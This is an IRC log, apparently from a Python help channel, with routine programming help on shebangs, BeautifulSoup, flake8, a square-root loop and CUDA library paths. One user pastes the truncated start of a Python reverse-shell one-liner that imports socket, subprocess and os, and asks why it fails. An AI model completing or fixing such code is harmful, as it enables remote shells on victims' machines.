[21:08:06] *** Joins: |oLa| (~|_oLa_|@2a00:23c5:8c0e:9900:d996:2f3e:f2a7:86e6)
[21:08:42] *** Quits: mnemonic (~semeion@unaffiliated/semeion) (Read error: Connection reset by peer)
[21:09:04] *** Quits: amirpro (~amirpro@41.235.244.66) (Remote host closed the connection)
[21:09:07] *** Joins: IanLiu (~IanLiu@189-69-38-63.dsl.telesp.net.br)
[21:09:29] *** Quits: biberu (~biberu@193.150.203.9) ()
[21:10:19] *** Joins: mnemonic (~semeion@unaffiliated/semeion)
[21:10:29] *** Joins: GodFather (~rcc@174-081-217-069.dhcp.chtrptr.net)
[21:11:01] *** Joins: rajrajraj (uid72176@gateway/web/irccloud.com/x-wdqainvbtwsyvqxi)
[21:11:27] *** Quits: rkfb (~rkfb@cpc1-glfd7-2-0-cust20.6-2.cable.virginm.net) (Ping timeout: 240 seconds)
[21:11:58] *** Joins: tuxd00d (~tuxd00d@unaffiliated/tuxd00d)
[21:12:23] *** Quits: zefferno (~zefferno@unaffiliated/zefferno) (Remote host closed the connection)
[21:12:35] *** Joins: rkfb (~rkfb@cpc1-glfd7-2-0-cust20.6-2.cable.virginm.net)
[21:12:43] *** Quits: Haudegen (~quassel@178.115.237.87) (Read error: Connection reset by peer)
[21:12:47] *** Quits: italic (~italic@unaffiliated/italic/x-8958156) (Ping timeout: 276 seconds)
[21:14:22] *** Joins: amirpro (~amirpro@41.235.244.66)
[21:14:59] *** Quits: rajrajraj (uid72176@gateway/web/irccloud.com/x-wdqainvbtwsyvqxi) (Client Quit)
[21:15:23] *** Quits: s14ve (~s14ve@ip-78-102-32-106.net.upcbroadband.cz) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[21:15:47] *** Quits: Arcaelyx (~Arcaelyx@2604:2000:f14a:2500:44b7:d903:69b3:3e53) (Quit: Textual IRC Client: www.textualapp.com)
[21:16:01] *** Joins: vyraeden (~vyraeden@85.108.109.203)
[21:16:50] *** Joins: sauvin (sauvin@about/linux/staff/sauvin)
[21:17:13] *** Quits: Beanzilla (~Beanzilla@unaffiliated/beanzilla) (Quit: sudo shutdown -h now)
[21:17:27] *** Joins: Haudegen (~quassel@178.115.237.87)
[21:18:05] *** Quits: rkfb (~rkfb@cpc1-glfd7-2-0-cust20.6-2.cable.virginm.net) (Ping timeout: 260 seconds)
[21:18:55] *** Joins: rkfb (~rkfb@cpc1-glfd7-2-0-cust20.6-2.cable.virginm.net)
[21:19:39] *** Joins: errelion (~errelion@x2f7fe4a.dyn.telefonica.de)
[21:19:44] <errelion> hey there
[21:20:26] *** Quits: nibble_zero (~nibble_ze@37.244.231.177) (Quit: nibble_zero)
[21:20:42] *** Joins: dimitrovskif (~dimitrovs@89.205.68.164)
[21:20:47] <errelion> ive got a little problem, i have and alias for python so that i execute ipython instead in the terminal, but i want to run scripts with the plain old python interpreter
[21:21:04] <errelion> but even with #!/bin/python at the beginning of my script it still uses ipython
[21:21:09] *** Quits: PulseAsio (~PulseAsio@dhcp-077-248-071-126.chello.nl) (Quit: Leaving)
[21:21:31] <Ninpo> python won't be in /bin
[21:21:47] <Ninpo> Unless you specifically put it there.
[21:22:03] <errelion> well thats awkward
[21:22:12] *** Joins: s14ve (~s14ve@ip-78-102-32-106.net.upcbroadband.cz)
[21:22:14] <errelion> i was trying to find the error for the past few minutes
[21:22:15] <clarjon1>  file /usr/bin/python
[21:22:18] <Ninpo> If you're putting that at the top and then typing "python myscript.py" it'll still attempt the alias
[21:22:20] <errelion> now that i ask i found it myself x
[21:22:21] <clarjon1> /usr/bin/python: symbolic link to python3
[21:22:33] <errelion> oh, that could be it as well
[21:22:38] <Ninpo> For a shebang line to work the script needs to be executable
[21:22:45] <Ninpo> chmod +x file.py
[21:22:48] <Ninpo> then ./file.py
[21:22:53] <errelion> my alias included python, which refered to the ipython alias
[21:22:55] <Ninpo> THEN it'll use the specified interpreter.
[21:22:56] *** Joins: Insayne (~Insayne@vodsl-9061.vo.lu)
[21:23:21] <Ninpo> (also /usr/bin/env python is better)
[21:23:32] <Ninpo> as in #!/usr/bin/env python
[21:23:32] <errelion> :Ninpo hmm, i cant remember i did put it in there
[21:23:32] *** Quits: psychicist__ (~psychicis@5356A22B.cm-6-7c.dynamic.ziggo.nl) (Ping timeout: 256 seconds)
[21:23:36] <Ninpo> (or python 3)
[21:23:40] *** Joins: inerthia (~inerthia@unaffiliated/inerthia)
[21:23:50] <Ninpo> python3*
[21:23:58] *** Quits: RebelCoder (~RebelCode@82.129.117.5) (Ping timeout: 260 seconds)
[21:24:01] <errelion> but thanks, it works! :>
[21:24:59] *** Joins: perrier-jouet (~perrier-j@modemcable162.77-81-70.mc.videotron.ca)
[21:25:24] *** Parts: errelion (~errelion@x2f7fe4a.dyn.telefonica.de) ()
[21:25:44] *** Quits: enriq (~pitagoras@190.104.249.158) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[21:26:31] *** Joins: zmv (~zmv@189.110.146.245)
[21:26:53] *** Quits: notzmv (~zmv@189.110.147.41) (Disconnected by services)
[21:26:57] *** zmv is now known as notzmv
[21:28:05] *** Quits: inerthia (~inerthia@unaffiliated/inerthia) (Ping timeout: 240 seconds)
[21:28:20] *** Quits: sdoherty (~sdoherty@pool-108-49-25-177.bstnma.fios.verizon.net) (Quit: Leaving)
[21:29:11] *** Quits: sdwrage (~textual@64.247.67.53) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[21:29:34] *** Quits: nonconvergent (c72f2503@gateway/web/freenode/ip.199.47.37.3) (Ping timeout: 260 seconds)
[21:29:38] *** Joins: sdwrage (~textual@64.247.67.53)
[21:29:58] *** Quits: rkfb (~rkfb@cpc1-glfd7-2-0-cust20.6-2.cable.virginm.net) (Quit: Lost terminal)
[21:30:12] *** Quits: sdwrage (~textual@64.247.67.53) (Client Quit)
[21:30:46] *** Quits: derk0pf (~derk0pf@p5497B8F0.dip0.t-ipconnect.de) (Ping timeout: 256 seconds)
[21:31:00] *** Quits: jcrab (4423392c@gateway/web/freenode/ip.68.35.57.44) (Quit: Page closed)
[21:32:00] *** Joins: yesno (~amrqx@unaffiliated/amrqx)
[21:33:49] *** Quits: mnemonic (~semeion@unaffiliated/semeion) (Read error: Connection reset by peer)
[21:33:55] *** Joins: backnforth (~backnfort@mctnnbsa45w-156-34-60-65.dhcp-dynamic.fibreop.nb.bellaliant.net)
[21:34:04] *** Joins: inerthia (~inerthia@unaffiliated/inerthia)
[21:34:57] *** Quits: m3ddl3r (~Thunderbi@192.30.201.10) (Ping timeout: 240 seconds)
[21:35:12] *** Quits: ramsub07 (~Instantbi@136.206.119.145) (Ping timeout: 245 seconds)
[21:35:25] *** Joins: sine0 (~sine0@unaffiliated/sine0)
[21:35:40] *** Joins: mnemonic (~semeion@unaffiliated/semeion)
[21:36:08] *** Joins: m3ddl3r (~Thunderbi@192.30.201.10)
[21:37:02] *** Joins: luist (~luisetero@200.162.132.134)
[21:37:34] <luist> whats a good way to break lines with many “or” and “and”s according to flake8?
[21:37:35] *** oakkitten is now known as squirrel
[21:37:47] *** Joins: partikkel (~partikkel@200116b868c35100f0938149aa2e017b.dip.versatel-1u1.de)
[21:37:51] *** Quits: UncleVasya_ (~UncleVasy@185-94-213-142.dynamic.ktkru.ru) (Ping timeout: 240 seconds)
[21:39:01] <sine0> hey folks, in bs4 im trying to get the value of a custom attribute on a div.
[21:39:05] *** Quits: inerthia (~inerthia@unaffiliated/inerthia) (Ping timeout: 260 seconds)
[21:39:20] *** Quits: tino097 (~tino097@37.25.85.35) (Quit: tino097)
[21:39:20] <grym> luist: i wrap it in parens and linebreak on keywords.  but maybe that's a c#/LINQ habit holding over
[21:39:24] <sine0> stackexchange shows me this bit of code, but i cant see how it relates: inputTag = soup.findAll(attrs={"name" : "stainfo"})
[21:39:47] <sine0> because it assumes taht i know the value of name
[21:40:29] *** Joins: giaco (~giaco@2-238-151-49.ip244.fastwebnet.it)
[21:40:32] <grym> luist: something like https://paste.pound-python.org/show/vMYQXAfeYntJav2rI1Kc/ .  I'm not going to fully endorse this as the best idea, but it makes sense for me
[21:40:42] *** Joins: volition (volition@gateway/vpn/privateinternetaccess/volition)
[21:40:50] <sine0> i want the value of ('div', attrs={'codecheck': '*unknown*'})
[21:40:56] <luist> hm
[21:41:43] <kousu> sine0: you can pass True instead of the string to just say "get my all divs that have a codecheck attr"
[21:41:44] *** Joins: jb1123 (~Thunderbi@143.139-242-81.adsl-dyn.isp.belgacom.be)
[21:42:23] *** Quits: dkmueller (~daniel@x590ce276.dyn.telefonica.de) (Quit: Konversation terminated!)
[21:42:27] <kousu> soup.find('div', attrs={'codecheck': True})['codecheck'] should do it, sine0
[21:42:36] <sine0> ok bossman let me check
[21:42:47] <sine0> thanks pal
[21:43:03] *** Joins: alexandre9099 (~alexandre@unaffiliated/alexandre9099)
[21:43:14] <kousu> yay. I did that from memory on a phone
[21:43:51] *** Joins: inerthia (~inerthia@unaffiliated/inerthia)
[21:44:15] <sine0> you are a g mate
[21:44:47] *** Quits: giaco (~giaco@2-238-151-49.ip244.fastwebnet.it) (Ping timeout: 245 seconds)
[21:46:10] *** Joins: edne (~edne@net-2-42-74-190.cust.vodafonedsl.it)
[21:46:18] *** Joins: enterprisey (~enterpris@wikipedia/enterprisey)
[21:46:20] *** Quits: s14ve (~s14ve@ip-78-102-32-106.net.upcbroadband.cz) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[21:47:14] *** Quits: LiftLeft2 (~loser@2001:19f0:5c01:1cb2:5400:1ff:fe83:8bed) (Ping timeout: 276 seconds)
[21:47:39] *** Quits: rendered (~chem@155-186-143-228.dhcp.chtrptr.net) (Ping timeout: 256 seconds)
[21:47:44] *** Joins: tty (~none@unaffiliated/minimalism)
[21:47:53] <luist> any smarter way to write this in less than 80 columns? https://paste.ofcode.org/B9Z7NUaeCWD75kTVkHfydr
[21:48:23] *** Quits: jstein (~jstein@gentoo/developer/jstein) (Quit: quit)
[21:48:32] *** Quits: inerthia (~inerthia@unaffiliated/inerthia) (Ping timeout: 245 seconds)
[21:48:38] *** Joins: zmv (~zmv@152.254.133.93)
[21:48:47] <bjs> luist: it looks fine, just ignore the fact it's over 80 columns?
[21:49:04] <luist> can’t…. flake8 rules
[21:49:10] *** Quits: cnidario (~dont@cli-5b7ec28e.ast.adamo.es) (Remote host closed the connection)
[21:50:02] <bjs> luist: rules are there to be broken :p
[21:50:03] *** Quits: Spaaaaaaaaaaaace (~Spaaaaaaa@unaffiliated/spaaaaaaaaaaaace) (Remote host closed the connection)
[21:50:24] *** Joins: bsaggy (~bsaggy___@unaffiliated/bsaggy)
[21:50:27] <luist> bjs: and employees are there to be fired
[21:50:35] <WhileTrue> could you please help me know why this doesnt print anything? https://paste.debian.net/1031779/
[21:51:02] <bjs> luist: my best advice would be therefore to break "not <some_flag>" into its own variable with a shorter name
[21:51:12] *** Joins: rtyupoi (~rtyupoi@78-11-218-76.static.ip.netia.com.pl)
[21:51:24] <bjs> WhileTrue: why do you think it _should_ print something?
[21:51:38] <kousu> luist: using logic rules you can shorten it
[21:52:03] <kousu> flag = not a and not b and not c == flag = not (a or b or c)
[21:52:22] *** Quits: notzmv (~zmv@189.110.146.245) (Ping timeout: 268 seconds)
[21:52:58] <bjs> kousu: technically i think those aren't equivalent in python, but yeah
[21:53:45] <kousu> bjs: because of short circuiting?
[21:53:49] <bjs> Yeah
[21:53:58] <WhileTrue> sorry, I think this is the more correct one: https://paste.debian.net/1031780/ bjs,  I want to print(y)
[21:53:59] <TheRealNoob> does python support static local variables?
[21:54:06] *** Quits: yesno (~amrqx@unaffiliated/amrqx) (Read error: Connection reset by peer)
[21:54:08] <bjs> TheRealNoob: 'static' as in the C keyword?
[21:54:11] <TheRealNoob> i mean static global
[21:54:12] <ssbr> TheRealNoob: nope
[21:54:15] *** Quits: IanLiu (~IanLiu@189-69-38-63.dsl.telesp.net.br) (Quit: IanLiu)
[21:54:18] <TheRealNoob> k ty
[21:54:28] <bjs> WhileTrue: you've just added a "while True" around it
[21:54:38] <kousu> TheRealNoob: you can use a closure. do you know about those from other langs?
[21:54:40] <ssbr> I really wish it did. super convenient way to do thread-safe globals, in C++
[21:54:48] *** Joins: yesno (~amrqx@unaffiliated/amrqx)
[21:54:50] <bjs> WhileTrue: that's definitely not correct doing it *outside* the function (did you even try run it?)
[21:55:14] *** Quits: rememberYou (~user@unaffiliated/rememberyou) (Remote host closed the connection)
[21:55:14] *** Quits: Johnjay (26780a63@gateway/web/freenode/ip.38.120.10.99) (Ping timeout: 260 seconds)
[21:55:15] <TheRealNoob> kousu, no.  I'm not looking to use it in this instance, just a thought i had last night while reading up on assembly
[21:55:20] <kousu> TheRealNoob: but maybe you should just write a class and use instance variables if you need state that sticks around
[21:55:31] <WhileTrue> bjs, I think after a month I have no damn idea about this
[21:55:46] <bjs> WhileTrue: okay, let's go back to your original code : this https://paste.debian.net/1031779/
[21:55:52] <bjs> WhileTrue: why do you think it should print anything?
[21:56:00] *** Joins: bpremo (~bpremo@2620:10d:c090:180::1:8731)
[21:56:07] *** Parts: kousu (~kousu@comms.kousu.ca) ("gucjcjc")
[21:56:55] *** Joins: jarthur_ (~jarthur@207.114.244.5)
[21:57:04] *** zmv is now known as notzmv
[21:57:27] <TheRealNoob> notzmv, now you're incognito
[21:57:47] <notzmv> yessss
[21:58:24] <bjs> WhileTrue: are you there?
[21:58:25] <WhileTrue> bjs, I thought I could try it for solving a problem. and I wanted to print the final result so I put print in line 5. that's why
[21:58:52] <bjs> WhileTrue: but can you see why that code doesn't print anything?
[21:58:57] *** Joins: AliGeek (~Thunderbi@78.172.235.234)
[21:58:59] <WhileTrue> bjs no
[21:59:02] <WhileTrue> that is the problem
[21:59:07] *** Joins: inerthia (~inerthia@unaffiliated/inerthia)
[21:59:10] *** Quits: Rapture (~textual@50-204-232-30-static.hfc.comcastbusiness.net) (Quit: Textual IRC Client: www.textualapp.com)
[21:59:11] <bjs> WhileTrue: okay, what do you think it should print?
[21:59:24] *** Quits: lumm (~lumm@221.41.136.77.rev.sfr.net) (Read error: Connection reset by peer)
[21:59:27] <WhileTrue> the final result of approximations to the square root
[21:59:35] <WhileTrue> the moment when y=x
[21:59:39] <bjs> WhileTrue: what final result? Trace through that code
[21:59:58] *** Quits: TheRealNoob (~TheRealNo@173-22-15-53.client.mchsi.com) (Quit: Leaving)
[22:00:27] *** Quits: AliGeyik (~Thunderbi@78.172.235.234) (Ping timeout: 240 seconds)
[22:00:37] *** Joins: derk0pf (~derk0pf@p5497B8F0.dip0.t-ipconnect.de)
[22:00:47] *** Joins: LiftLeft2 (~loser@2001:19f0:5c01:1cb2:5400:1ff:fe83:8bed)
[22:00:57] *** Quits: jarthur (~jarthur@207.114.244.5) (Ping timeout: 264 seconds)
[22:01:24] <WhileTrue> bjs, in the original code, there was "break" in line 5, so that the script ended when the final or desired value was reached.
[22:01:35] <bjs> WhileTrue: there's no loop in your original code
[22:01:41] <bjs> You can't have had a break
[22:01:43] <WhileTrue> the code iterates for a closer approximation to square root
[22:01:49] *** Quits: partikkel (~partikkel@200116b868c35100f0938149aa2e017b.dip.versatel-1u1.de) (Quit: My iMac has gone to sleep. ZZZzzz…)
[22:02:00] <bjs> WhileTrue: you need to show me the real code you're looking at it
[22:02:11] *** Quits: jarthur_ (~jarthur@207.114.244.5) (Ping timeout: 256 seconds)
[22:02:22] <WhileTrue> bjs, this is it; https://paste.debian.net/plain/1031782
[22:02:24] <bjs> WhileTrue: else we're looking at different snippets of code and it'll be confusing
[22:02:41] *** Quits: hemstock (hemstock@80.244.31.40) (Read error: Connection reset by peer)
[22:03:05] *** Quits: AliGeek (~Thunderbi@78.172.235.234) (Ping timeout: 240 seconds)
[22:03:07] *** Quits: renlo (~lhoward@4.14.106.6) (Ping timeout: 245 seconds)
[22:03:08] *** Quits: m8 (~m8@unaffiliated/m8) (Read error: Connection reset by peer)
[22:03:12] <bjs> WhileTrue: okay, that code *definitely* prints stuff
[22:03:21] <bjs> WhileTrue: what is your question about it?
[22:03:38] *** Joins: AliGeyik (~Thunderbi@78.172.235.234)
[22:04:38] *** Quits: elichai2 (uid212594@gateway/web/irccloud.com/x-vryyqpptqubjklyo) (Quit: Connection closed for inactivity)
[22:05:49] <WhileTrue> bjs, I would like to use this snippet to print a single approximate value of square root for each of the numbers from 1 to 9, that is, without displaying the iterations for each number while calculating its square root
[22:06:12] <bjs> WhileTrue: okay, so how many times does print get called in this mysqrt function?
[22:06:14] *** Joins: renlo (~lhoward@4.14.106.6)
[22:06:31] <WhileTrue> none
[22:06:48] <bjs> WhileTrue: uhh, are you sure?   https://paste.debian.net/plain/1031782 this code definitely calls print
[22:07:02] <WhileTrue> ah sorry, sure, once
[22:07:11] *** Quits: darkhanb (~darkhanb@ip24-253-111-229.lv.lv.cox.net) (Ping timeout: 255 seconds)
[22:07:14] <bjs> WhileTrue: okay, that's how many times you've written it
[22:07:22] <WhileTrue> okay, 5 times, I think
[22:07:25] <bjs> WhileTrue: but it's in a loop, how many times might print actually be run
[22:07:31] <bjs> WhileTrue: and you don't want it to run 5 times?
[22:07:33] <WhileTrue> 5?
[22:07:33] *** Joins: bpremo_ (~bpremo@c-71-196-223-147.hsd1.co.comcast.net)
[22:07:55] <bjs> WhileTrue: (may be 5, may be more, it prints once for each iteration of the loop, i.e. each approximation, right?)
[22:08:18] *** Quits: inerthia (~inerthia@unaffiliated/inerthia) (Ping timeout: 256 seconds)
[22:08:22] <WhileTrue> bjs, it may run 15 times, I dont mind, but I'd like to display only the square roots of numbers from 1 to 9, without showing 5 iterations for each square root
[22:08:23] *** Quits: cerealguy (uid86634@gateway/web/irccloud.com/x-gnplxzufciqxtcwx) (Quit: Connection closed for inactivity)
[22:08:42] <bjs> WhileTrue: okay, so when *do* you want to display the approximation in mysqrt()
[22:08:57] *** Quits: jb1123 (~Thunderbi@143.139-242-81.adsl-dyn.isp.belgacom.be) (Ping timeout: 245 seconds)
[22:09:06] *** Joins: hemstock (~hemstock@109.123.118.53)
[22:09:36] *** Joins: Technodrome (~textual@unaffiliated/technodrome)
[22:09:42] *** Quits: InPhase (~InPhase@unaffiliated/inphase) (Quit: Lost terminal)
[22:09:53] *** Quits: bpremo (~bpremo@2620:10d:c090:180::1:8731) (Ping timeout: 255 seconds)
[22:10:17] <WhileTrue> when the approximation's error is below a certain difference
[22:10:35] *** Quits: cacarimas (a1093d83@gateway/web/freenode/ip.161.9.61.131) (Quit: Page closed)
[22:10:43] <bjs> WhileTrue: okay, so... at the end?
[22:10:46] <WhileTrue> like diff=mysqrt-math.sqrt<0.003
[22:11:01] <WhileTrue> diff in absolute values
[22:11:07] *** Joins: Radicarianubis (~Radicaria@cpe-72-231-246-183.buffalo.res.rr.com)
[22:11:09] *** Joins: rajrajraj (uid72176@gateway/web/irccloud.com/x-hmptekpnnegzgesh)
[22:11:18] *** Joins: [itchyjunk] (~itchyjunk@unaffiliated/itchyjunk/x-1640057)
[22:11:24] <bjs> WhileTrue: so i have two questions: why don't do you call print() once at the end (after the loop) and where in the code do you figure out that diff?
[22:12:13] <WhileTrue> I add a new function, refer to mysqrt in this function, and I tried to call print in a dozen different places in and out of these functions, but never got a single line of output
[22:12:48] <WhileTrue> I added diff into the new function
[22:12:57] *** Quits: jancoow_ (~jancoow@dhcp-077-251-034-091.chello.nl) (Ping timeout: 256 seconds)
[22:13:04] *** Joins: methyl (~methyl@unaffiliated/methyl)
[22:13:44] <bjs> WhileTrue: so your mysqrt() function can print at the end (did you try that?)
[22:14:32] *** Quits: davr0s (~textual@host86-138-235-28.range86-138.btcentralplus.com) (Quit: My MacBook Pro has gone to sleep. ZZZzzz…)
[22:15:07] *** Quits: adamholmberg (~adamholmb@69.80.114.120) (Remote host closed the connection)
[22:15:47] *** Joins: ramsub07 (~Instantbi@79.97.172.52)
[22:15:48] <WhileTrue> mysqrt function is printing properly
[22:15:58] <WhileTrue> the desired output, I mean
[22:16:00] *** Joins: Sir_Andrei (~user@2800:a4:1429:5e00:58d6:d425:46ae:ad94)
[22:16:03] <Sir_Andrei> Hi
[22:16:10] <Sir_Andrei> Have somebody here installed Tensorflow?
[22:16:18] <Sir_Andrei> tensorflow-gpu (from pypi).
[22:16:18] *** Joins: sydbarret (~Username@unaffiliated/sydbarret)
[22:16:20] <WhileTrue> bjs, mysqrt function is printing properly
[22:16:22] <bjs> WhileTrue: i thought you just said it printed too many times?
[22:16:55] <Sir_Andrei> 'Cause I've installed it, and when I try to use it it says "ImportError: libcublas.so.9.0: cannot open shared object file: No such file or directory"
[22:17:16] <Sir_Andrei> In /usr/local/cuda-9.0/lib64 there is a file called "libcublas.so.9.0".
[22:17:34] *** Quits: Geekologist (~me@unaffiliated/geekologist) (Remote host closed the connection)
[22:17:35] *** Quits: Radicarianubis (~Radicaria@cpe-72-231-246-183.buffalo.res.rr.com) (Ping timeout: 260 seconds)
[22:17:44] <WhileTrue> bjs, no, I meant that in my current goal, I dont want it to print all the iterations as it does in its original form
[22:17:55] <dezka> Sir_Andrei: maybe run `ldconfig` at the terminal?
[22:18:01] <dezka> sometimes that's needed in my experience
[22:18:11] <WhileTrue> bjs, because my current goal is to print square roots of different numbers, not the iterations for the square root of a single number
[22:18:15] *** Joins: corretico (~corretico@200.91.143.34)
[22:18:16] <bjs> WhileTrue: I'm confused, you say "no", it prints the right number of times
[22:18:19] <bjs> then immediately say it doesn't
[22:18:21] <bjs> which is it?
[22:18:29] <WhileTrue> no I am saying the same thing
[22:18:43] <bjs> WhileTrue: which is it? Does mysqrt() print the correct number of times?
[22:18:55] *** Joins: Narrat (~Narrat@p5DED151C.dip0.t-ipconnect.de)
[22:18:58] <Sir_Andrei> Dezka, done.
[22:19:02] <Sir_Andrei> But it stills don't work.
[22:19:13] <dezka> Doh, ok. was worth a shot
[22:19:34] <dezka> what does your LD_LIBRARY_PATH env var look like?
[22:19:42] <dezka> does it include that /usr/local path?
[22:20:07] <Sir_Andrei> On .bashrc i wrote the line "export LD_LIBRARY_PATH=/usr/local/cuda/lib64"
[22:20:12] *** Joins: amikrop (0255c8c9@gateway/web/freenode/ip.2.85.200.201)
[22:20:19] *** Quits: rpg (~rpg@sift.net) (Quit: Textual IRC Client: www.textualapp.com)
[22:20:37] <amikrop> If all I need is to retrieve a zip file from the web, is there a reason to use requests instead of urllib?
[22:20:40] <dezka> isn't it in cuda-9.0 though instead of cuda?
[22:21:14] <dezka> i would just do /usr/local so it can find whatever else it needs
[22:21:32] <Sir_Andrei> Oh... sorry, I'm stupid...
[22:21:39] <Sir_Andrei> It's cuda-9.0
[22:21:44] <WhileTrue> bjs, I dont set manually how many times it prints, but the function runs properly, since the square root is approximated.
[22:21:52] <dezka> :)
[22:21:58] <bjs> WhileTrue: okay, that didn't answer the question
[22:21:59] <snatcher> is there a builtin way to convert ['a', 'b', 'c'] to [['a', 'b', 'c'], ['a', 'b'], ['a']]?
[22:22:02] *** Quits: efm (~efm@vpn.tummy.com) (Read error: Connection reset by peer)
[22:22:16] <bjs> WhileTrue: if I call `mysqrt(25, 6)` does it print the number of times you want it to?
[22:22:23] *** Joins: efm (~efm@vpn.tummy.com)
[22:22:50] <WhileTrue> bjs, I've just said it, it is not me who wants it to print any number of times
[22:22:51] <Sir_Andrei> Working C:
[22:22:54] *** Joins: manuelschneid3r (~manuelsch@p57A39159.dip0.t-ipconnect.de)
[22:22:56] <Sir_Andrei> Thx..., sorry for my stupid wu
[22:22:58] <Sir_Andrei> question*
[22:23:05] *** Quits: realnot (~realnot@unaffiliated/realnot) (Ping timeout: 240 seconds)
[22:23:06] <bjs> WhileTrue: i don't care _who_ wants to print _how_ many times
[22:23:09] <dezka> all good, we've all done it
[22:23:12] <dezka> np
[22:23:20] <energizer> snatcher: no
[22:23:25] <bjs> WhileTrue: then what is your question? You keep talking about printing
[22:24:25] *** Quits: amikrop (0255c8c9@gateway/web/freenode/ip.2.85.200.201) (Client Quit)
[22:24:30] <SnoopJeDi> snatcher, itertools might have something but you could do `[thelist[:N] for N in range(len(thelist))]` (which kinda gross because range(len(..)) but it works)
[22:24:48] *** Quits: vikikas (~vikas@2a02:1205:c6ad:ea0:9deb:71c8:a80f:fd43) (Read error: Connection reset by peer)
[22:24:52] <bjs> WhileTrue: maybe I've misunderstood, let's go back to https://paste.debian.net/plain/1031782  -- what _exactly_ is the problem with this code?
[22:25:13] *** Quits: codymj (~codymj@rrcs-71-41-86-116.se.biz.rr.com) (Quit: Leaving)
[22:25:36] <WhileTrue> bjs, this code is by itself totally ok. my question is about a second problem that I want to solve using this code.
[22:25:43] <SnoopJeDi> snatcher, oh yep, look at the powerset() recipe in the itertools docs: https://docs.python.org/3/library/itertools.html
[22:25:48] <bjs> WhileTrue: okay, and what exactly is that second problem?
[22:26:07] *** Quits: tiwula (~lane@184.170.76.198) (Quit: Leaving)
[22:26:11] <SnoopJeDi> although powerset() isn't really any better and might have the wrong behavior if you have repeated elements.
[22:26:11] *** Quits: ohcibi (~quassel@thisdone.de) (Quit: No Ping reply in 180 seconds.)
[22:26:19] *** Quits: Nickeeh (~quassel@bulbasaur.sjorsgielen.nl) (Quit: No Ping reply in 180 seconds.)
[22:26:46] *** Quits: methyl (~methyl@unaffiliated/methyl) (Ping timeout: 264 seconds)
[22:26:48] <bjs> SnoopJeDi: also it's a recipe and therefor automatically useless
[22:27:20] <WhileTrue> bjs, this second problem is to display/print the square roots of numbers from 1 to 9, and these square roots will be approximates like the pasted function calculates them. and the difference between these approximations and python calculations (via math.sqrt) will be below a set margin.
[22:27:20] <energizer> it's not clear if that's what they want, but powerset is in more-itertools
[22:27:38] <SnoopJeDi> bjs, how do you figure?
[22:27:42] *** Joins: Nickeeh (~quassel@bulbasaur.sjorsgielen.nl)
[22:27:57] *** Quits: MrNeon (~quassel@93.102.246.157.rev.optimus.pt) (Ping timeout: 240 seconds)
[22:28:03] <bjs> WhileTrue: okay, and how are you going to approach that
[22:28:16] *** Joins: scampbell (~scampbell@mail.scampbell.net)
[22:28:22] <ali1234> hmmmmmmmmm exec is puzzling :)
[22:28:25] <bjs> SnoopJeDi: have to go copy and paste code and therefore isn’t really “built in”
[22:28:29] *** Quits: Technodrome (~textual@unaffiliated/technodrome) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[22:28:40] *** Joins: ohcibi (~quassel@thisdone.de)
[22:29:04] <energizer> ali1234: ill bite. what are you doin
[22:29:10] <`7hr34t_hvntr>  /nick t_huntr
[22:29:14] <ali1234> energizer: same thing as before
[22:29:27] *** `7hr34t_hvntr is now known as t_huntr
[22:29:29] <energizer> ali1234: i missed the part about exec
[22:29:46] <ali1234> energizer: well loading a module = exec(source, module.__dict__)
[22:29:57] <ali1234> did you see the part about magic variables?
[22:30:01] *** Joins: neobenedict (~Neobenedi@unaffiliated/neobenedict)
[22:30:02] <neobenedict> hi hi
[22:30:12] <mefistofeles> hello
[22:30:15] <neobenedict> https://paste.pound-python.org/show/zMwQox6NvzigHiqXJ7MP/
[22:30:19] <neobenedict> debian 8
[22:30:28] <neobenedict> 3.6.x installed fine
[22:30:30] <neobenedict> whats up :c
[22:30:40] <energizer> ali1234: if you discussed it earlier im sure people asked whats wrong with importlib, ?
[22:30:49] *** Quits: streuner (~streuner@gateway/tor-sasl/streuner) (Ping timeout: 250 seconds)
[22:30:50] <ali1234> energizer: i'm using importlib
[22:31:00] <ali1234> specifically importlib.abc.FileLoader
[22:31:23] <ali1234> i need to write another 500 word "this is what i am doing" documents
[22:31:24] <Orion]> I have two lists [0,1,0,0] [0,1,0,1], I want to return the index at which both the lists are 1 (so 1 in this case) - best way to do this?
[22:31:25] *** Joins: lolidunno (~lolidunno@cpe-45-50-100-24.socal.res.rr.com)
[22:31:44] *** Quits: ThiefMaster (thief@indico/developer/thiefmaster) (Quit: meow.)
[22:31:45] *** Joins: tmsmith (~tmsmith@71-88-197-197.dhcp.kgpt.tn.charter.com)
[22:31:46] *** Quits: kajo (~kajo@2001:4c50:371d:8400:ca2a:14ff:fe0f:7dd1) (Ping timeout: 265 seconds)
[22:31:47] <sartan> uh, hmm, zip() ?
[22:31:49] <ali1234> energizer: i am making my own scripting language that is like python, but different
[22:31:51] <sartan> are the lists always same length?
[22:32:02] *** Joins: bpremo__ (~bpremo@2620:10d:c090:180::1:8731)
[22:32:16] <energizer> ali1234: i think theres a newer way to do that: https://stackoverflow.com/a/67692/3346095
[22:32:20] *** Quits: hemstock (~hemstock@109.123.118.53) (Ping timeout: 245 seconds)
[22:32:26] *** Joins: enriq (~pitagoras@190-186-16-190.fibertel.com.ar)
[22:32:37] <Orion]> sartan, yes
[22:32:43] *** Joins: lorddaedra (~lorddaedr@78.157.211.238)
[22:32:46] <`7hr3t_hvntr`> anyone know why this would throw an error claiming socket isn't defined
[22:32:47] <sartan> (idx for idx, item_a, item_b enumerate(zip(a, b)) if item_a == 1 and item_b == 1)
[22:32:52] <`7hr3t_hvntr`> "__import__("socket"),__import__("subprocess"),__import__("os");s=socket.socket(..."
[22:32:54] <SnoopJeDi> `next(i for i, v in enumerate(zip(list1, list2)) if v == (1, 1))`
[22:32:58] <ali1234> energizer: i can't use regular python import because i need to do brain surgery on the modules
[22:32:58] <bjs> WhileTrue: okay I think I'm gonna stop you going off in a wild direction: I  think the best course of action will be to alter mysqrt() slightly, so it doesn't print anything
[22:33:01] <sartan> (idx for idx, item_a, item_b in enumerate(zip(a, b)) if item_a == 1 and item_b == 1)
[22:33:04] <bjs> WhileTrue: but instead just returns the final approximation
[22:33:14] <ali1234> energizer: because they are not python code, they just happen to use python syntax
[22:33:15] *** Joins: Kundry_Wag (~Kundry_Wa@186.214.80.183)
[22:33:22] <ali1234> they have different rules
